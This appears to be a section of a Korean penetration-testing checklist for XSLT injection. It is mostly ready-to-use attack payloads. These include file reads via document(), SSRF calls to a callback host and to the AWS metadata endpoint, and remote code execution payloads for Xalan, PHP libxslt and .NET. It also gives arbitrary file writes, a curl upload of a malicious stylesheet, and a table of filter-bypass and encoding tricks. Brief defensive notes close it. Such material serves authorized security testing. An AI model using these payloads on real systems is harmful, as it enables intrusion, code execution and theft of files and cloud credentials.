### Phase 2: 동적 테스트 (검증)

**기본 페이로드:**

**파일 읽기 (`document()`):**
```xml
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:template match="/">
    <out><xsl:value-of select="document('file:///etc/hostname')"/></out>
  </xsl:template>
</xsl:stylesheet>
```

**정보 노출 (`system-property`):**
```xml
<xsl:value-of select="system-property('xsl:vendor')"/>
<xsl:value-of select="system-property('xsl:version')"/>
<xsl:value-of select="system-property('xsl:product-name')"/>
<xsl:value-of select="system-property('xsl:vendor-url')"/>
```

**SSRF (`document()` + 외부 URL):**
```xml
<xsl:value-of select="document('https://CALLBACK.oast.fun/xslt-ssrf')"/>
<xsl:value-of select="unparsed-text('https://CALLBACK/xslt')"/>  <!-- XSLT 2.0+ -->
<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>  <!-- AWS metadata -->
```

**RCE — 프로세서별:**

| 프로세서 | 페이로드 |
|---|---|
| Xalan-J (Java) | `xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"` + `<xsl:value-of select="rt:exec(rt:getRuntime(),'id')"/>` |
| Xalan ProcessBuilder | `xmlns:pb="http://xml.apache.org/xalan/java/java.lang.ProcessBuilder"` + `<xsl:variable name="p" select="pb:new(...)"/>` |
| libxslt (PHP) | `xmlns:php="http://php.net/xsl"` + `<xsl:value-of select="php:function('system','id')"/>` |
| libxslt (PHP exec) | `<xsl:value-of select="php:function('exec','id')"/>` |
| .NET XslCompiledTransform (`EnableScript=true`) | `<msxsl:script language="C#" implements-prefix="user">public string Run(){...}</msxsl:script>` |
| Saxon EE Java binding | Java 클래스 직접 호출 (라이센스 환경 한정) |
| Saxon CE/HE | `xsl:result-document` 외부 파일 쓰기 |

**XSLT 3.0 동적 평가:**
```xml
<xsl:value-of select="fn:transform(map{'stylesheet-text':'... 임의 XSLT ...'})"/>
```

**Xalan 확장 (`xalan:`):**
```xml
xmlns:xalan="http://xml.apache.org/xalan"
<xsl:value-of select="xalan:write('/tmp/evil.txt', 'content')"/>
<xsl:variable name="x" select="xalan:pipeDocument(...)"/>
```

**XSL-FO 외부 이미지 (SSRF):**
```xml
<fo:external-graphic src="https://CALLBACK/xslfo"/>
```

**파라미터 인젝션 (XSLT 안 변수에 사용자 입력):**
```
?xpath=document('/etc/hostname')
?xpath=system-property('xsl:vendor')
```

**전체 XSLT 본문 업로드:**
```bash
curl -X POST "https://target/api/transform" -H "Content-Type: application/xml" --data-binary @evil.xsl
# evil.xsl에 위 페이로드 포함
```

---

**우회 페이로드:**

| 방어 | 페이로드 |
|---|---|
| JAXP secure processing만 활성화 | `document()`/`unparsed-text()` 자체는 secure 대상 아님 — 별도 `ACCESS_EXTERNAL_DTD/STYLESHEET` 속성 필요 |
| 외부 스타일시트 fetch만 차단 | 인라인 `<msxsl:script>`/Saxon extension 등 내부 확장으로 우회 |
| `EnableScript=false` (.NET) | `EnableDocumentFunction` 별도 — `document()`로 LFI/SSRF 가능 |
| 화이트리스트 스타일시트 | 경로 traversal로 다른 스타일시트 선택 (`stylesheet=../admin/x.xsl`) |
| Content-Type 검증 (`text/xml`) | `application/xml`, `application/xslt+xml`, `text/xsl` 변형 |
| UTF-8 검증 | UTF-16 BOM (`\xfe\xff`), CDATA 래핑 |
| 키워드 차단 (`Runtime`) | Class.forName 호출 분할 — `xmlns` URI를 `&#x52;untime` 같은 entity로 |
| `script` 태그 차단 | Saxon extension functions, Xalan `pipeDocument` 등 다른 경로 |

**Encoding 변형:**
```xml
<!-- entity로 키워드 분할 -->
<xsl:value-of select="document(&#x66;ile:///etc/hostname)"/>

<!-- CDATA 래핑 -->
<xsl:value-of select="document('file&#58;///etc/hostname')"/>
```

---

**참고사항:**

- 빈출 sink: "리포트 템플릿 업로드", "XSL-FO PDF 생성", "데이터 변환" 기능
- PHP `XSLTProcessor::registerPHPFunctions` 호출이 코드에 보이면 즉시 RCE 위험
- .NET `XsltSettings.EnableScript=true` 설정이 prod 코드에 있으면 즉시 위험
- Java `TransformerFactory`는 secure processing 명시 필요 — 기본값 비활성
- XSLT 2.0+ 환경에서 `unparsed-text()`/`fn:transform()`로 추가 공격면
- libxslt 환경에선 `xmlns:php` 외 `xmlns:exsl`도 일부 확장 함수 제공
- 입력 XML/XSLT 본문은 multipart 업로드, JSON 안 base64, raw body 등 다양 — 모두 시도
- Xalan-J의 `xalan:write`는 임의 파일 쓰기 게이트 — config 파일 덮어쓰기 가능
- Saxon HE (오픈소스)는 Java binding 제한적 — Saxon EE/PE만 풀 RCE
- XSL-FO는 PDF 생성 환경 — pdf-generation-scanner와 결합 빈번
- 외부 fetch (`document(url)`)만으로도 SSRF 영향도 — RCE 미확인이어도 후보 유지
- secure processing이 `setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true)`로 활성화되면 대부분 차단 — 명시 확인 필수
- XSLT injection은 신뢰할 수 없는 입력이 XSLT 본문에 들어가는 경우만 — 데이터(XML)만 사용자 입력이면 영향 없음
